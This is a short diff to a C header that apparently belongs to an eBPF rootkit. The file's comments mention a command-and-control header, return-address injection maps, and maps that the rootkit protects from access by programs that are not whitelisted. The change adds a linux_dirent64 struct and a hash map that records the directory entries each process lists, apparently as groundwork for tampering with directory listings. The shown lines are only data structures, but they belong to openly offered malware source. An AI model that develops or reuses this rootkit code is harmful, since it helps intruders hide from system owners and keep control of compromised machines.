@@ -3,6 +3,14 @@
 
 #ifndef __H_TCKIT
 #include "headervmlinux.h"
+#else
+struct linux_dirent64 {
+	long long d_ino;
+	unsigned long long d_off;
+	short unsigned int d_reclen;
+	unsigned char d_type;
+	char d_name[0];
+};
 #endif
 #include "../../../common/c&c.h"
 
@@ -58,6 +66,12 @@ struct inj_ret_address_data{ //Map value
 	__s32 padding;
 };
 
+
+//Map value, stores last dirent info of directory by process
+struct fs_dir_log_data{
+	struct linux_dirent64 dirent_info;
+};
+
 struct fs_priv_open{ //Map
 	__uint(type, BPF_MAP_TYPE_HASH);
 	__uint(max_entries, 4096);
@@ -104,6 +118,15 @@ struct inj_priv_ret_address{ //Map
 	__type(key, __u64); //thread group id(MSB) + pid (LSB)
 	__type(value, struct inj_ret_address_data);
 } inj_ret_address SEC(".maps");
+
+
+//Stores directories listed by a process, for later processing at its exit
+struct fs_priv_dir_log{ //Map
+	__uint(type, BPF_MAP_TYPE_HASH);
+	__uint(max_entries, 4096);
+	__type(key, __u64); //thread group id(MSB) + pid (LSB)
+	__type(value, struct fs_dir_log_data);
+} fs_dir_log SEC(".maps");
 
 /*PROTECTED MAPS*/
 //Any attempt to access these maps will be blocked by the rootkit if the program is not whitelisted
